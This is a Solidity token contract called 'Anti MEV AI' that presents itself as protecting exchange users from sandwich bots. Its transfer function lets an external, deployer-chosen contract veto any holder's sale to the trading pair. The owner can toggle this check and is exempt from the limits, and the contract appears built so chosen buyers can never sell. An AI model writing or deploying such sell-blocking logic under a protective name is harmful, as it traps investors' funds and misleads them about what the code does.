// SPDX-License-Identifier: MIT

/*
    Anti MEV AI

    A comprehensive approach to safeguarding DEX users
    from sandwich bots in every project.
    
    TG: https://t.me/antimevai
*/

pragma solidity 0.8.7;

import "IUniswapV2Factory.sol";
import "IUniswapV2Pair.sol";
import "IUniswapV2Router02.sol";

import "Address.sol";
import "Ownable.sol";
import "ERC20.sol";

interface IMevAI {
    function checkForMev(address from) external view returns (bool);
}

contract AntiMev is ERC20, Ownable {

    bool public isMevProtectionActive = true;

    uint256 public txLimit;
    uint256 public walletLimit;

    address public pair;

    mapping(address => uint256) public _lastBuyBlock;
    mapping(address => bool) private _noLimits;

    IMevAI public mevAI;
    IUniswapV2Router02 public uniswapV2;


    constructor(address _mevAI) ERC20("Anti MEV AI", "MEVai") {
        address owner = _msgSender();

        uint256 totalSupply = 100_000_000 * 10 ** 18;

        txLimit = (totalSupply * 20) / 1000;
        walletLimit = (totalSupply * 20) / 1000;

        mevAI = IMevAI(_mevAI);
        uniswapV2 = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        // Exclude from limits
        _noLimits[address(this)] = true;
        _noLimits[owner] = true;

        _mint(owner, totalSupply);
    }

    function initializePair(address newPair) external onlyOwner {
        pair = newPair;
    }

    function toggleMevProtection(bool value) external onlyOwner {
        isMevProtectionActive = value;
    }

    function updateLimits(uint256 maxTx, uint256 maxWallet) external onlyOwner {
        uint256 minPercentage = (totalSupply() * 1) / 100;
        require(maxTx >= minPercentage, "INVALID PARAMETER");
        require(maxWallet >= minPercentage, "INVALID PARAMETER");

        txLimit = maxTx;
        walletLimit = maxWallet;
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (!(_noLimits[from] || _noLimits[to])) {
            
            if (from == pair && to != address(uniswapV2) && ! _noLimits[to]) {
                require(amount <= txLimit, "OVER TX LIMIT");
                require((balanceOf(to) + amount) <= walletLimit, "OVER WALLET LIMIT");
            }
            // ® Anti MEV AI protection module
            if (to == pair && isMevProtectionActive && (mevAI.checkForMev(from) || (block.number - _lastBuyBlock[from]) < 1)) revert();
            if (from == pair) _lastBuyBlock[to] = block.number;
        }
        super._transfer(from, to, amount);
    }
}